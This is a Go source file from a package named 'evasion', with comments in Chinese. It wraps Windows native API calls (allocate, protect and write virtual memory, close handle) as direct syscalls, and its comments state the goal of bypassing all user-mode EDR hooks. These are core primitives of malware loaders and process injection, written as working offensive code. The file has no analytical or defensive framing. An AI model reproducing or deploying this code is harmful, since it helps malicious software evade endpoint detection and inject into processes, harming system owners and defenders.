//go:build windows

package evasion

import (
	"syscall"
	"unsafe"
)

// rawSyscall6 由syscall_amd64.s实现
// 直接执行SYSCALL指令，绕过所有用户态EDR hook
func rawSyscall6(ssn uint32, a1 uintptr, a2 uintptr, a3 uintptr, a4 uintptr, a5 uintptr, a6 uintptr) uintptr

// rawSyscall4 由syscall_amd64.s实现
// 4参数版本，用于NtClose等简单syscall
func rawSyscall4(ssn uint32, a1 uintptr, a2 uintptr, a3 uintptr, a4 uintptr) uintptr

// syscallNewLazyDLL 包装syscall.NewLazyDLL供SSN回退路径使用
func syscallNewLazyDLL(name string) *syscall.LazyDLL {
	return syscall.NewLazyDLL(name)
}

// ===== 直接syscall包装函数 =====
// 替代原apiresolve_windows.go中的LazyDLL.Call()
// 通过SSN + SYSCALL指令直接进入内核，绕过EDR hook

// DirectNtAVM 直接syscall: NtAllocateVirtualMemory
func DirectNtAVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, allocType uintptr, protect uintptr) uintptr {
	ssn := GetSSN("NtAllocateVirtualMemory")
	if ssn == 0 {
		return 0xC0000001 // STATUS_UNSUCCESSFUL
	}
	return rawSyscall6(ssn,
		hProcess,
		uintptr(unsafe.Pointer(baseAddr)),
		0, // ZeroBits
		uintptr(unsafe.Pointer(regionSize)),
		allocType,
		protect,
	)
}

// DirectNtPVM 直接syscall: NtProtectVirtualMemory
func DirectNtPVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, newProtect uintptr, oldProtect *uint32) uintptr {
	ssn := GetSSN("NtProtectVirtualMemory")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall6(ssn,
		hProcess,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(regionSize)),
		newProtect,
		uintptr(unsafe.Pointer(oldProtect)),
		0,
	)
}

// DirectNtWriteVM 直接syscall: NtWriteVirtualMemory
func DirectNtWriteVM(hProcess uintptr, baseAddr uintptr, buffer uintptr, size uintptr, bytesWritten *uintptr) uintptr {
	ssn := GetSSN("NtWriteVirtualMemory")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall6(ssn,
		hProcess,
		baseAddr,
		buffer,
		size,
		uintptr(unsafe.Pointer(bytesWritten)),
		0,
	)
}

// DirectNtClose 直接syscall: NtClose
func DirectNtClose(handle uintptr) uintptr {
	ssn := GetSSN("NtClose")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall4(ssn, handle, 0, 0, 0)
}

// NtStatusIsError 检查NTSTATUS是否表示错误
func NtStatusIsError(status uintptr) bool {
	return status&0xC0000000 == 0xC0000000
}
